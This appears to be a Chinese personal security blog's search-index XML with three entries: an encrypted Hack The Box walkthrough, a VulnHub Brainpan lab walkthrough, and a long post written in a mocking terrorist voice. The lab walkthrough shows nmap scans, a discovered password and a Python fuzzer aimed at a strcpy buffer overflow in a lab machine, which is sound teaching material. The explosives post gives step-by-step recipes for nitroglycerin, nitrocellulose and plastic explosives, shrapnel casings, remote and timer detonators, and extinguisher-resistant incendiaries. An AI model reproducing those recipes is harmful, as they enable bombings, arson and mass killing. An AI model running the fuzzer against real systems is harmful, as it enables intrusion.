<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hack-The-Box-walkthrough[blunder]</title>
    <url>/2020/06/05/blunder/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the users.php pass hash</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="990dbe670cf1e4b1a5bccebf7ffac034a86397a52eae9b9d5e7e23427b11e2ad"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>炸药制造(deep web)</title>
    <url>/2019/02/06/bomb-deep-web/</url>
    <content><![CDATA[<h3 id="从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下："><a href="#从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下：" class="headerlink" title="从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下："></a>从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下：</h3><p><strong><em>原料:</em></strong><font color="red">滴管，玻璃杯两个，碳酸钠（俗称苏达），浓硝酸，浓硫酸，甘油，这些都能在化学药品商店买到，当然为了避免暴露身份，比较推荐的方法是到中学化学实验室里面去偷，一盆水，不需要太满，一个搪瓷茶缸，最好还有温度计，注意家里用来量体温的温度计是不能用的，一是量程不够用，二来是体温计的特性在温度到达最高点之后除非用手甩，否则水银柱不会下降，那么您很有可能就此为了伟大事业献身。最后推荐ph试纸，当然可以用普通酸碱指示剂替代。</font></p>
<p><strong><em>步骤:</em></strong></p>
<p>1、在一个玻璃杯中加上大概80毫升的水</p>
<p>2、在另一个玻璃杯中除加上80毫升水外，基本添上一平勺碳酸钠，所谓的勺子是指不锈钢的西式餐勺，如果使用中式的汤匙那就差很多了。配成碳酸钠溶液。</p>
<p>3、好,现在是时候将一个搪瓷茶缸放入水盆中了，然后缓慢（注意）加入8~10毫升左右的浓硝酸，用温度计测量温度，要到20度以下。差点忘记说了，冬季可能比较容易，夏秋季节的话，呵呵，那还是准备一些冰块吧。之所以那么低的温度是浓硝酸在高温下分解极快。</p>
<p>4、慢慢地加入22~28毫升的浓硫酸，也要注意，速度慢，温度要保持住，绝不能再高了。有条件使用冰块的还要低一些。5、用滴管把甘油滴到混合物上，速度要慢，每分钟大概4、5滴就差不多了。而且还是那句话，温度绝对不能上升，否则您很容易就去见马克思了。一直要滴到甘油在混合物表面形成甘油层为止。</p>
<p>6、在低温下用筷子搅拌一刻钟。筷子用完以后千万不要再用它吃饭了。完毕后把混合物缓慢倒入蒸馏水的杯子中。硝酸甘油比重较大，会沉底。而且由于折射率的不同，两种液体分层后，两种液体的分界线还是比较容易分辨的。</p>
<p>7、把下层的硝酸甘油滴到碳酸钠溶液中，目的是为了去除多余的酸，因为酸性的硝酸溶液氧化性非常强。是极其危险的。至于够不够到中性，就要依靠您的酸碱指示剂了。</p>
<p>　　制作完了之后，千万要注意不要振荡摇晃。如果那样的话——向毛主席保证，您一定会见到他老人家。如果您想试验一下它的威力的话也不是不可以，通常可以取一个小玻璃药瓶，注满硝化甘油之后，从高楼上任它自由落体，你会明白什么叫做东京轰炸的威力缩小版。</p>
<p>　　另外您要明确一个的概念是，炸药和炸弹是有区别的。瞧，我们手上已经有了炸药，但是它还称不上是一个炸弹。我们辛辛苦苦制造出来的“宝贝”，如果一不小心就会要了我们的命，当然我们恐怖分子并不害怕为了伟大的事业献身，但是壮志未酬身先死未免太可惜了。每天要提心吊胆会多么严重的挫伤我们的积极性啊。</p>
<p>　　下一步的加工首先是要让它变得稳定，通常，稳定硝化甘油的方法少说也有100种，最流行的恐怕就硝酸甘油和硝酸钾、硝化棉、木粉填料、矿脂、活性碳粉混合在一起。当年伟大的诺贝尔先生就是靠这玩意一举成为大富翁，还创立了大名鼎鼎的诺贝尔奖为世界科学作出了巨大的贡献。当然现在我们作为他的后人也不能甘于其后啊。</p>
<p>　　扯远了，刚才的方法是比较流行的，但是并不是唯一的，般来说，把硝化甘油和挥发性低的次级炸药、粘结剂、填充料等加上其他乱七八糟的东西混合在一起基本可以满意。为了体现每个圣战者的个性，您可以随意选择配料，比如面粉，鸡蛋，蜂蜜奶油，冰激凌等等等等。我个人的偏好是以胡椒粉为主，用方便面的面块固定（版权所有，盗版必究）。</p>
<p>　　如果您制造的硝化甘油数量比较大的话，那么您就无需费神考虑弹体了，一个普通公事包或者旅行包完全可以满足您的一切要求——携带方便，高雅大方。特别推荐皮尔卡丹的，它不透气。把固态的炸药要往里面一填就可以了。不过您制造的剂量不若不够大，那么无疑好的弹体能令您事半功倍。一个普通市民想要得到手榴弹形状的铁质部件不太可能，建议您diy，不知您对以前的雀巢咖啡瓶子是否有印象，那就是一个不错的弹体。重要的是如果您想锦上添花的话，您可以用蚀刻玻璃的方法将表面划成几百个小块，什么？你不知道如何蚀刻？那么用玻璃刀也可以。当然您还可以在上面画一些花纹来表示您的高雅情趣。形成独特的艺术流派什么的。不过别忘了把他的头部塑料瓶口部分用胶带也好什么也好紧紧封起来，以便玻璃瓶体能够顺利破成弹片。再给您一个狠主意，如果您要对付的对象是十恶不赦天怒人怨或者和您有不共戴天之仇的话，还记得前面的填充剂吗？您可以把它改成铝热剂，也就是所谓铝粉和氧化铁粉的混合制剂。当爆破的时候由于高温，将会使铁铝发生反应，变成氧化铝和炽热铁水（亮白色）而四散飞溅！杀伤力极强，如果您有非凡的目力，您会看到真正的飞火流星！注：可能性不大。</p>
<p>最后就是引爆系统，用一根药捻子的导火索无疑是会令同行耻笑的，我目前有两个备选方案。</p>
<p>1、用对讲机的无线电系统，把一个拆下来之后，会得到一个共频系统，将其中一个制造成短路情况安装在炸弹上，然后用其他一些见电火花即可燃烧的炸药放在一起。这样一来就可以实现通话——短路——火花——引爆药点燃——炸药爆炸的遥控。当然无线电话是更好的选择，播一个号码就可以爆炸，简直就是《间接伤害》的翻版。不过缺点是成本高。而且还要担心串频走火还有某个不识时务的混蛋给你打电话，那可真是死不瞑目了。</p>
<p>2、定时系统，也很简单，普通的电子闹钟就可以胜任。手法和上面的差不多。不过，你一定要有准时的习惯，表也得很准，呵呵。</p>
<p>　　好了，本讲座就到这里，祝你好运。如果各位有兴趣的话，我还会继续推出其他制作讲座，比如很受各位喜爱的tnt，塑胶炸弹，燃耗弹等等特殊要求的炸弹。</p>
<p>　　上一讲我们已经谈了硝化甘油炸弹的制作方法，但是除了硬碰硬的纯大威力杀伤炸弹之外，相信不少同道也曾碰到有一些特殊需要的局面。这一讲就是专门论述这种炸弹。</p>
<p>　　作为恐怖分子，毫无疑问业界c4是最大名鼎鼎。但是c4既不是威力最大的，也不是制作最简单的，之所以如此广泛应用最大原因就是它便于隐藏和运输。否则在海关被fbi扣住可实在是太丢面子了。c4主要成分是环三甲撑、三硝胺、甲撑和润滑油。另外一个优点就是可以附着在物体表面，可以对目标最脆弱的部分攻击从而达到一击即中的效果。</p>
<p>　　与之具有同样性质的东西我估计就数本人的最爱——rdx了，它是c4的提炼物，或用六甲撑四胺和丙酮净化过的硝酸混合制成。我的记忆中它可以和淀粉、面粉、洗衣粉等等家居用品混合而不遭受怀疑。当然你要是愿意，白粉也可以。更可怕的是他可以和面粉、鸡蛋、蜂蜜、香精等等制作成饼干，曲奇等等绝对杀人于无形。一旦需要，只要把它用一些挥发性液体泡湿然后捏实就可使用，实在是居家旅行，杀人灭口之必备良药。嘿嘿。但是他的成分都是比较难以得到的东东。所以各位也只能望料兴叹了。</p>
<p>　　好了，再次回到我们的问题上来，那么有可塑性的炸药就真的没有办法制作了吗？不是的，这就需要我们来发挥创造力了，本人经过多年潜心研究日思夜想终于在睡梦中发掘了一个成本低廉制作简单的可塑炸弹制作方法（门捷列夫？），啪啪啪（鼓掌，山呼海啸般的万岁声）！c4，rdx本身具有多种性质，但是我们在某个用途总可以得到用某个替代品，同时也可以依靠混合物使某些炸药附带上其他性质。也就是说我们只需要把不可塑的炸药和一些可塑的合剂杂糅在一起就可以了，最简单地说，把汽油和面粉揉在一起，就可以使汽油具有可塑性和粘着性（恐怖的汽油面团？）。好了首先我们要确定分散质是什么。我比较推荐的硝化棉，学名叫作三硝酸纤维酯。这玩意的出现大大促进了现代枪炮的发展，后来我们的同行——法国炸药工程师p?维埃利于1884年，诺贝尔先生于1887年，分别以不同的方式改进，造成了无烟火药，至今仍然应用于枪弹、炮弹发射药领域，威胁着几十亿人的生命~~呵呵。</p>
<h3 id="好了言归正转，制作方法如下："><a href="#好了言归正转，制作方法如下：" class="headerlink" title="好了言归正转，制作方法如下："></a>好了言归正转，制作方法如下：</h3><p><strong><em>原料：</em></strong>浓硝酸（百分之六十几那种），浓硫酸（98%），药用棉花（药品商店里面多的是），容器自备。</p>
<p>1、将浓硝酸和浓硫酸以体积比一比二配成混合溶液。注意要慢和冷，搅拌均匀，详细说明在我上一次写的炸弹制作教程已经写得很清楚了。如果您需要指导我可以另外给您一份操作手册，当然价格嘛～</p>
<p>2、将药用脱脂棉浸入混合溶液中，要浸透。想想着这是你的仇人现在要把他泡到酸里去，嘿嘿。</p>
<p>3、小资：泡杯咖啡，慢慢享用。看段芭蕾舞。</p>
<p>情歌王子：把“你是疯儿我是傻”唱上四五遍。</p>
<p>李宁第二：做俯卧撑，引体向上仰卧起坐等等。</p>
<p>瘾君子：尽量离远一些再抽烟，否则我不能对您的生命安全负责。</p>
<p>4、看着时间到20分，请大喊一声“大功告成”，然后以迅雷不及掩耳盗铃之势将那块棉花取出。</p>
<p>5、用水冲洗干净。请确定是中性。</p>
<p>6、摊平棉花，在一个风和日丽万里无云万物滋长的合适时机放到阳台上晒干。7、收工<del>~</del></p>
<p>差点忘记对您说，做炸药的时候嘴上千万不要叼着烟。什么？您已经殉职了？请允许我对您表示沉重的哀悼。：（</p>
<p>　　接下来就要看您的用途是什么了，如果您只是做普通备用炸药，那就压实，封包，比较直接的方法就是用报纸包起来用重物压好，最后外面用黄色的宽胶带纸层封好加上足够长的导火索即可。一般可以呈扁平形状，当然其实你可以选择其他的形状也可以。它适合在比较狭窄的地方爆破。把很窄的缝隙分离开来。</p>
<p>　　我相信您在对付一些门锁的时候，曾经想过用炸药炸开，这种时候相信您会考虑塑胶型炸药，制作也很简单，把刚才做好的硝化棉溶解在乙醇和乙醚里面，加上树脂之类的东西来调节它的粘稠度。必要时可以添加类似口香糖之类的树脂，制造成口香糖炸弹，酷～～相信007式的情节在您手中再现一定令您激动不已吧，呵呵。</p>
<p>　　但是事实上我并不推荐用乙醚来制作这玩意儿，因为乙醚是一种全身麻醉剂，浸透毛巾后捂住口鼻可以使人在短时间内失去知觉，至于怎么个短法……，我没试验过，从电视里面大概是几秒钟吧。总之有很大的用途。</p>
<p>　　另外一种还是我们的偶像诺贝尔先生发明的，把硝化棉和硝化甘油（制作方法上次讲过）混合，添加树酯等等可以作成胶质炸弹。威力更大，更重要的是在热气下可以压成绳状，那么物理性质应该类似于加工过程中的方便面，呵呵。通常来说，为了避免伤及无辜，请您在郊外盖间茅屋，以响应我佛慈悲的大无畏精神啊。阿门。</p>
<p>　　最后推荐的是比较有艺术气息的用品了，请我们缪斯女神的化身－－tnt登场！！（闪光灯唰唰，掌声如雷）！可能您会有疑问，tnt如何和艺术挂钩呢？这取决于它的一个性质，在摄氏大概185度左右，它会熔化。到时候可以浇铸成任何形状。您想必也知道可以用石膏和腊作人像等，但是您有没有想过用tnt那么前卫的材料作艺术品呢？到时候您大可以向中央美术学院借几个维纳斯的模子。浇铸一个tnt维纳斯！如果喜欢也可以铸大卫。那将无论如何是后现代艺术的杰作，哈哈哈哈。</p>
<p>　　上一讲我们讲了一些特种爆破炸弹的制作方法，现在让我们把眼睛从炸弹上移开，把注意力调整到燃烧弹上来。有人说“学习二战找个啤酒瓶子装上汽油，塞个布头，用火机一点，轰！整个世界就平静了！”（俗称莫罗托夫鸡尾酒）。不客气地说一句，如果用文明史来打比方的话，这也就处于周口店的水平。我这篇文章好歹进步到文艺复兴了，至于说什么电气化，信息化，我们还差得远呢。古人曰，学无止境，难道在这么个水平你就满足了？那可真是缺乏进取心。另外，燃烧弹是不会有轰的声音的，最多就是玻璃瓶子碎掉的呯。好了，书归正转，开讲。</p>
<p>同学们好！（老师好！）</p>
<p>　　要讲讲如何制作性能优良，质量上乘的燃烧弹，首先要弄清楚几个概念，怎样才是一个性能优良的燃烧弹。燃烧值高，燃烧温度高固然是一个重要方面，还有更重要的包括燃烧速度，和抗灭火能力，以及必要的附加性质和杀伤能力等等。</p>
<p>　　无论从哪个角度说，单纯使用汽油作的燃烧弹都是三流中的三流货色。从前段时间某些自焚人士的实践表明，在一个消防体系完备的环境中，纯汽油根本无法起到高效的杀伤作用。</p>
<p>　　汽油的燃烧值是无需怀疑的，但是燃烧值高并不意味着燃烧温度就高。大家可能知道，大部分所谓易燃物质如酒精等都不能在液态下直接燃烧，我们所点燃的都是挥发到空气中的蒸汽，他们必须以气态才能够与氧气充分混合燃烧。燃烧的火焰提高温度加速液体挥发，燃烧才能进行。这一方面浪费了大量的气化热，一方面也限制了燃烧温度。其实很多江湖卖艺的都会做一种表演：将手泡到酒精中后取出点燃，可以看到手上的淡蓝色火焰，看似惊险其实没有什么奥秘，更不会对人体造成伤害，他们甚至能够感觉手上凉飕飕的，只要有胆量，大部分人都可以作。提高温度通常会在汽油中添加一些燃剂，就我个人而言可能是添加镁粉或者铝热剂，普通火焰温度是几百度，以这种添加剂可以达到一千度，一千五百度，高的可能接近两千度。不但加大杀伤力和引燃能力，也可以大大加快燃剂挥发速度。</p>
<p>　　除了提高温度，抗灭火能力也是极其重要的，很多人有一种根深蒂固的观念，火焰总是会被灭火器扑灭的，事实上，燃烧弹在灭火措施面前不仅不是任人宰割的，有的时候甚至能反客为主令灭火措施完全失效。最简单反灭火手段莫过于大大加快燃烧速度，在对方还没有来得及作出反应的时候就结束，或者把火势放大到不可收拾的地步。上面的镁粉就是一种，高温下汽油挥发燃烧速度起码加快两倍。其次就是抗灭火器了，目前比较广泛应用的是水，二氧化碳的泡沫灭火器，干粉灭火器等等。这些灭火器的工作原理是降温，隔绝空气中的氧气，和干扰火焰中的活性基团结合等等。这些都是可以避开的，首先是水，不能用水来灭油类火灾是常识，所以我们通常不会碰到，即使碰到了，不但加速火势蔓延，还可能因为镁在热水中生成氢氧化镁放出氢气，在爆炸极限浓度中甚至可以产生爆炸，我们求之不得。嘿嘿，接下来是二氧化碳灭火剂，那就更有意思了，不广为人所知的一件事情是，镁不仅能够在空气中燃烧，它还可以在二氧化碳中燃烧！放出大量的热然后变为氧化镁和碳，至于碳作用也不小，它是呈微粒的粉状，在有水情况下可能会产生水煤气，也就是一氧化碳和氢气的混合物，无水情况下也可以不完全燃烧成一氧化碳，或者回到老家去变成二氧化碳。总之即使燃烧 ，也可能产生有毒气体。最后是对付干粉灭火器，干粉灭火器的原理是产生大量小微粒以干粉形式喷到火焰上，干扰活性基团的结合，从而灭火。这就回到了燃烧的本质问题上来了，燃烧作为一种比较剧烈的氧化还原反应，空气中的氧气是比较常见的氧化剂，但绝对不是唯一的，必要时甚至可以自备氧化剂。通常的硝酸、硝酸钾和浓硫酸都是相当不错的，这样一来就彻底消除了以隔绝空气的灭火手段。</p>
<p>　　最后就是黏着能力的问题，很多时候我们的目标是倾斜或者垂直的平面，如果用汽油很可能会流光而无法达到效果，通常可以使用橡胶溶剂来调节粘稠度。做法是把橡胶（尽量选择天然的）切成小块，溶解到汽油中即可。</p>
<p>　　好了，现在出现了两种思路。第一种就是高温快速派的，方法是橡胶溶解汽油中添加碱液、镁粉、铝热剂、油脂、松香、蛋清、肥皂、石蜡和甚至动物血。这些材料的不是必要的，属于可选范围，比例和配方自定，它的特点是温度高，粘着性很强，燃烧迅速。还有炽热的铁水和镁氧化辅助。基本上无法扑灭也来不及扑灭。性质与军方使用的胶凝汽油差不多。引燃系统我推荐是把一两块干净的钠用薄的药棉裹好贴在瓶子表面，这样一来，一旦瓶子被扔出破裂，钠和瓶内的一些水份及有机物接触，就会发生反应放热和氢气，点燃燃烧弹。千万不要和我谈什么拿打火机点布条之类的手段，传出去都不好意思见人。</p>
<p>　　另一种思路则是，同样是橡胶汽油，但是添加的是浓硫酸、硝酸钾、木工的锯末和少量研碎石蜡，这里要注意的是，浓硫酸占的体积分数可以到10%左右。它的特点是自带氧化剂，所以可以抗许多灭火器材，甚至还有一定的爆炸能力。扑灭的可能性比前者还要低。基本碰上就是神仙也无救。引燃系统就比较多种多样了，前者的棉花裹钠仍然可以使用，其次就是在表面贴上一层在氯化钾、糖，混合溶液中浸泡过晾干的纸。瓶子一破，硫酸与这些成分接触就会燃烧起来。好像还有一种就是在溶液中添加高锰酸钾，缺点是不稳定，容易走火。还有一点就是要尽量保证燃烧液中没有水分，因为有水分的话，浓硫酸会产生氢离子，使硝酸钾变为酸性，比较危险。</p>
<p>　　当然咯，以一个完美主义者的态度来看，两个燃烧弹合在一起是最好的，但是不能够直接混合，因为一个酸性一个碱性，如果可以的话，二个瓶子装捆在一起无疑是非常好的，基本就是无所畏惧的超级燃烧弹了。哈哈哈。</p>
<p>　　除这些以外，您也可以添加一些其他的东西，比如建筑上使用的松节油，油漆，其他的如塑料袋等，可以产生浓重的黑烟和刺激性气体和少量毒性，干扰灭火人。</p>
<p>　　最后再给您一个狠主意，如果您有一点点铀却又不足以到达临界质量制作原子弹的话，那么大可以添加到这里来，产生的高温足以将其液化甚至少量气化，除了杀伤救火人员之外，其下风方向会产生一定的核沾染，基本就属于灭绝人性的法子了。</p>
<p>　　最后向各位说明的是，制作炸弹也好，燃烧弹也罢，既不是高精尖科技，也不是一个捻子一个雷式的土法生产。他需要化学，物理，结构力学，材料力学，医学，甚至日常生活方面各种的知识。所有人包括我都仅仅处于学习，研究，探索过程中。欢迎各位有兴趣的同学一起来切磋。我们的口号是：“威力无极限！！！” </p>
]]></content>
      <categories>
        <category>制作</category>
      </categories>
      <tags>
        <tag>deep web</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan-1]</title>
    <url>/2020/01/26/brainpan-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Brainpan：1<br>发布日期：2013年3月20日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXA=">https://download.vulnhub.com/brainpan/Brainpan.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXAudG9ycmVudA==">https://download.vulnhub.com/brainpan/Brainpan.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> _               _                         </span><br><span class="line">| |__  _ __ __ _(_)_ __  _ __   __ _ _ __  </span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |</span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_|</span></span><br><span class="line"><span class="string">                        |_|                </span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>

<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，在任何情况下概不负责任何损失或损害，包括但不限于间接或随之而来的损失或损害，或任何损失或损害因使用引起的或与使用有关的数据或利润损失该软件。<br>TL; DR：如果发生坏事，这不是我的错。</p>
<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan经过测试，发现可在以下虚拟机监控程序上工作：<br>-VMware Player 5.0.1<br>-VMWare Fusion 5.0<br>-VirtualBox 4.2.8<br>将Brainpan导入首选的虚拟机监控程序并配置网络根据需要进行设置。它会通过DHCP获取IP地址，但是建议在NAT内运行它，或者仅对主机操作系统可见，因为它容易受到攻击。</p>
<p>资料来源：Brainpan.zip/readme.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5（brainpan.ova）= fc0f163220b9884df5dcc9cdc45361e4</span><br></pre></td></tr></table></figure>
<p>资料来源：Brainpan.zip/md5.txtVulnHub独家！</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫一顿</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.115</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">MAC Address: 08:00:27:DE:BA:CA (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -v -Pn -sV 192.168.56.115</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>

<p>访问一下看看是什么东西:</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub188.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub189.jpg"></p>
<p>扫一下目录看看</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub190.jpg"></p>
<p>在bin目录中有一个二进制文件？</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub191.jpg"></p>
<p>将这个exe文件下载下来，然后用ollydbug工具调试</p>
<p>调试之前，先分析下brainpan.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># file brainpan.exe </span></span><br><span class="line">brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), <span class="keyword">for</span> MS Windows</span><br><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># strings brainpan.exe </span></span><br><span class="line">!This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">.text</span><br><span class="line">`.data</span><br><span class="line">.rdata</span><br><span class="line">@.bss</span><br><span class="line">.idata</span><br><span class="line">[^_]</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">[^_]</span><br><span class="line">[get_reply] s = [%s]</span><br><span class="line">[get_reply] copied %d bytes to buffer</span><br><span class="line">shitstorm</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line">                          &gt;&gt; </span><br><span class="line">                          ACCESS DENIED</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line">[+] initializing winsock...</span><br><span class="line">[!] winsock init failed: %d</span><br><span class="line"><span class="keyword">done</span>.</span><br><span class="line">[!] could not create socket: %d</span><br><span class="line">[+] server socket created.</span><br><span class="line">[!] <span class="built_in">bind</span> failed: %d</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port %d</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[+] check is %d</span><br><span class="line">[!] accept failed: %d</span><br><span class="line">[+] cleaning up.</span><br><span class="line">-LIBGCCW32-EH-3-SJLJ-GTHR-MINGW32</span><br><span class="line">w32_sharedptr-&gt;size == sizeof(W32_EH_SHARED)</span><br><span class="line">../../gcc-3.4.5/gcc/config/i386/w32-shared-ptr.c</span><br><span class="line">GetAtomNameA (atom, s, sizeof(s)) != 0</span><br><span class="line">AddAtomA</span><br><span class="line">ExitProcess</span><br><span class="line">FindAtomA</span><br><span class="line">GetAtomNameA</span><br><span class="line">SetUnhandledExceptionFilter</span><br><span class="line">__getmainargs</span><br><span class="line">__p__environ</span><br><span class="line">__p__fmode</span><br><span class="line">__set_app_type</span><br><span class="line">_assert</span><br><span class="line">_cexit</span><br><span class="line">_iob</span><br><span class="line">_onexit</span><br><span class="line">_setmode</span><br><span class="line">abort</span><br><span class="line">atexit</span><br><span class="line">free</span><br><span class="line">malloc</span><br><span class="line">memset</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">signal</span><br><span class="line">strcmp</span><br><span class="line">strcpy</span><br><span class="line">strlen</span><br><span class="line">太多了省略。。。</span><br></pre></td></tr></table></figure>

<p>这里有几个很重要：</p>
<ul>
<li>这个brainpan.exe看起来与端口9999上的侦听过程相同</li>
<li>shitstorm 看起来像密码</li>
<li>strcpy 可能是缓冲区溢出攻击向量</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub192.jpg"></p>
<p>显然，应该尝试可能的密码shitstorm。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.115 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; shitstorm</span><br><span class="line">                          ACCESS GRANTED</span><br></pre></td></tr></table></figure>

<p>返回。<br>嗯…如何检查strcpy函数。<br>虽然有适用于Linux的Evan的Debugger和Immunity Debugger（通过wine执行），但我选择在Windows环境中将Immunity Debugger用于“windozy”类型的任务。</p>
<p>免责声明：对于那些已经知道如何执行简单的strcpy缓冲区溢出的人，可以快速进入下一节，因为这本身就很冗长且“用户友好”。选择为每个步骤包括大量的模糊测试代码和详细信息，以便对这种攻击媒介不熟悉的任何人都可以轻松学习并希望了解该过程。</p>
<p>是时候使用快速模糊器来看看是否可以获取导致段错误的输入。这是经常使用的一些代码，并在进行过程中使用shellcode和register进行修改。简单，有效。</p>
<p>etfuzz.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 1000</span><br><span class="line"> </span><br><span class="line">payload = junk </span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>是时候运行brainpan.exe并使用Immunity Debugger附加到进程。在Windows机器上侦听该进程的情况下，在端口9999上放置1000个模糊测试（\x41），看看是否遇到段错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

